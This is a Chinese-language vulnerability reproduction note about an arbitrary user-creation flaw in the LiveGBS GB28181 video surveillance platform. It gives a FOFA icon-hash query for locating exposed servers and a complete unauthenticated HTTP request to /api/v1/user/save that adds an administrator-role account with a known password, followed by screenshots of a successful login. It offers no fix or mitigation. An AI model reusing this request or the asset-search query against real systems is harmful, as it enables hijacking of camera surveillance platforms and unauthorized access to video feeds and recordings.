# LiveGBS save存在任意用户添加漏洞

# 一、漏洞简介
LiveGBS是一款基于GB28181协议的安防监控软件，专为集中统一管理和观看所有摄像头、硬盘录像机等设备而设计。它支持GB28181注册接入，可向上级联第三方国标平台，提供可视化的WEB页面管理，使用户能够轻松实现设备的远程监控和管理。LiveGBS具备多项强大功能，包括云台控制、设备录像检索与回放、语音对讲、用户管理等。同时，它支持多种协议流输出，实现浏览器无插件直播，让用户能够随时随地通过Web端查看监控画面。LiveGBS save存在任意用户添加漏洞。

# 二、影响版本
+ LiveGBS 

# 三、资产测绘
+ fofa`icon_hash="-206100324"`
+ 特征

![1714840195509-17413bb5-8988-4807-907b-1335a5357ea9.png](./img/G22NguMpq0EvMZ3E/1714840195509-17413bb5-8988-4807-907b-1335a5357ea9-579412.png)

# 四、漏洞复现
```plain
GET /api/v1/user/save?ID=&Username=root12&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Connection: close
```

添加的用户名为`root12/12345678`

![1714840241628-f71f03e1-785d-443e-b720-f1650443f616.png](./img/G22NguMpq0EvMZ3E/1714840241628-f71f03e1-785d-443e-b720-f1650443f616-327422.png)

测试登录

![1714840261984-9c870b53-d781-4302-b2dc-fbd1f2352b48.png](./img/G22NguMpq0EvMZ3E/1714840261984-9c870b53-d781-4302-b2dc-fbd1f2352b48-649257.png)



> 更新: 2024-05-18 12:34:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qda2azg0wd52xg13>